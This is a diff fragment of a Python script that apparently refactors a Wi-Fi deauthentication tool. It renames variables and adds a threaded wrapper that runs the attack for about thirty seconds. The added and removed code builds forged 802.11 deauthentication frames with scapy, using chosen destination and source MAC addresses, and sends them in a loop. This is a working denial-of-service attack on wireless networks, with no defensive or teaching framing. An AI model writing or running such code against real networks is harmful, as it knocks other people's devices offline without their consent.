@@ -61,12 +61,24 @@ def test(packet):
     #     # if(packet.addr2 == "28:16:7f:fc:97:f1"):
     #     if packet.addr2 not in observedclients:
     #             print (packet.addr2)
-    #             observedclients.append(packet.addr2)
-        
-def deauthenticate(iface, destMac, srcMac):
-    while flag:
-        pkt = scapy.all.RadioTap()/scapy.all.Dot11(addr1=destMac, addr2=srcMac, addr3=srcMac)/scapy.all.Dot11Deauth()
-        scapy.all.sendp(pkt, iface=interfaceglob, count=1, inter=.2, verbose=0)
+    #             observed_clients.append(packet.addr2)
+
+def run_deauthenticate(iface, dest_mac, src_mac):
+    thread = threading.Thread(target=deauthenticate, args=(iface, dest_mac, src_mac))
+
+    thread.start()
+    for i in range(15):
+        time.sleep(2)
+        print(".", end='', flush=True)
+    #Stop the running thread
+    print(".")
+    thread.do_run = False
+
+def deauthenticate(interface, dest_mac, src_mac):
+    t = threading.currentThread()
+    while getattr(t, "do_run", True):
+        pkt = scapy.all.RadioTap()/scapy.all.Dot11(addr1=dest_mac, addr2=src_mac, addr3=src_mac)/scapy.all.Dot11Deauth()
+        scapy.all.sendp(pkt, iface=interface, count=1, inter=.2, verbose=0)
          
 if __name__ == "__main__":
     # interface = sys.argv[1]
